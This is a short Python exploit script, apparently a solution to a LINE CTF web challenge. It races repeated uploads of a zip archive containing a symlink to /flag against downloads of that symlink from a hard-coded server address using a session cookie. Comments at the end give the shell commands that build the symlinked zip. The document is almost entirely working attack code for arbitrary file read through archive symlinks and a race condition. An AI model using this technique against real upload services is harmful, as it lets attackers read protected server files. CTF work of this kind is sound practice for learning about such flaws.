import concurrent.futures
import re
import requests

requests.packages.urllib3.disable_warnings()

s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080"}
s.verify = False

# BASE_URL = "http://localhost:11000"
BASE_URL = "http://34.84.43.130:11000"
s.cookies.update({"vapor_session": "7rdRJvdENl1ibzWLxFkHGwhf3Mf2zA1Y6i2HyqjuIDk="})

def upload():
    s.post(f"{BASE_URL}/upload", files={"data": open("tmp.zip", "rb")})


def download():
    resp = s.get(f"{BASE_URL}/download/symlink.txt")
    if m := re.findall(r"LINECTF", resp.text):
        print(resp.text)


def main():
    for _ in range(100):
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            executor.submit(upload)
            executor.submit(download)


if __name__ == "__main__":
    main()


#ln -s /flag symlink.txt
#zip --symlinks tmp.zip symlink.txt
#unzip -t tmp.zip  # check